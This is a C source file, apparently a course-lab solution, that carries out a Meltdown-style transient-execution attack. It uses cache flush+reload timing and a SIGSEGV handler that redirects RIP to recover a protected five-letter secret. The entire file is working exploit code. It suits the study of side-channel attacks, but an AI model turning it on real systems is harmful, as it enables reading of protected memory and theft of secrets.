#include "recover_protected_local_secret.h"

#include <assert.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define __USE_GNU
#include <signal.h>

#include "util.h"

extern uint8_t label[];

const size_t MIN_CHOICE = 'A' - 1;
const size_t MAX_CHOICE = 'Z' + 1;
const size_t SECRET_LENGTH = 5;

static inline page_t *init_pages(void) {
    page_t *pages = calloc(UINT8_MAX + 1, PAGE_SIZE);
    assert(pages != NULL);
    return pages;
}

static inline void flush_all_pages(page_t *pages) {
    for (size_t i = MIN_CHOICE; i <= MAX_CHOICE; i++) {
        flush_cache_line(&pages[i]);
    }
}

static inline size_t guess_accessed_page(page_t *pages) {
    uint64_t thresh = 250;
    for (size_t i = MIN_CHOICE; i <= MAX_CHOICE; i++) {
        if ((time_read(&pages[i]) < thresh) && (time_read(&pages[i]) < thresh)) {
            return i;
        }
    }
    return 0;
}

static inline void do_access(page_t *pages, size_t secret_index) {
    cache_secret();
    force_read(pages[access_secret(secret_index)]);
}

// typedef struct ucontext {
//     struct ucontext *uc_link;    // Pointer to the previous context (when context is
//     exited). sigset_t         uc_sigmask; // Signal mask specifying blocked signals
//     during context execution. stack_t          uc_stack;   // Stack information (stack
//     pointer and size). mcontext_t       uc_mcontext; // Machine-specific context
//     information (i.e. CPU registers).
//     // Additional fields or padding may be present in the actual structure
// } ucontext_t;

// Implement a SIGSEGV handler
/*
sig = Number of the signal that caused the handler to be invoked, SIGSEGV in this case
siginfo = A struct providing more context about the signal, which can include info
such as what address caused the fault.
context = A pointer to a ucontext_t struct that contains the CPU contetx at the time
the signal was raised.
*/
static void sigsegv_handler(int sig, siginfo_t *siginfo, void *context) {
    ucontext_t *ucontext = (ucontext_t *) context;
    // uc_mcontext.gregs is an array containing the general-purpose register values,
    // and REG_RIP is the index for RIP instruction pointer on x86-64. Set instruction
    // pointer to address of label, which is defined in the asm code in main using
    // asm volatile("label:")
    ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t) label;
    (void) siginfo;
    (void) sig;
}

// struct sigaction {
//     void (*sa_handler)(int);         Pointer to signal handling function.
//     sigset_t sa_mask;                Additional set of signals to be blocked during
//     execution of the signal handler. int sa_flags;                    Flags that
//     control the behavior of the signal handling. void (*sa_sigaction)(int, siginfo_t *,
//     void *);  Alternate signal handling function with more information.
// };

int main() {
    // Define a `struct sigaction` to specify the signal handling semantics.
    struct sigaction action;

    // Set the `sa_sigaction` field to be the address of the `sigsegv_handler` function,
    // which handles the segmentation fault (SIGSEGV).
    action.sa_sigaction = sigsegv_handler;

    // Use the SA_SIGINFO flag to indicate that the signal handler takes three arguments
    // instead of one, which allows the handler to get detailed information about the
    // signal.
    action.sa_flags = SA_SIGINFO;

    // Install the signal handler for the SIGSEGV signal. When a SIGSEGV occurs,
    // the `sigsegv_handler` function is invoked instead of the process being terminated.
    sigaction(SIGSEGV, &action, NULL);

    page_t *pages = init_pages();

    for (size_t i = 0; i < SECRET_LENGTH; i++) {
        // Use a flag to determine if the correct character has been guessed.
        bool flag = true;
        // Keep trying to guess the character until successful.
        while (flag == true) {
            flush_all_pages(pages);
            do_access(pages, i);

            // Assembly label used as a jump target for the signal handler if a
            // segmentation fault occurs.
            asm volatile("label:");

            size_t guess = guess_accessed_page(pages);
            if ((guess > MIN_CHOICE) && (guess < MAX_CHOICE)) {
                printf("%c", (char) guess);
                fflush(stdout);
                // Exits while loop, moving on to next character.
                flag = false;
            }
        }
    }
    printf("\n");
    free(pages);
}
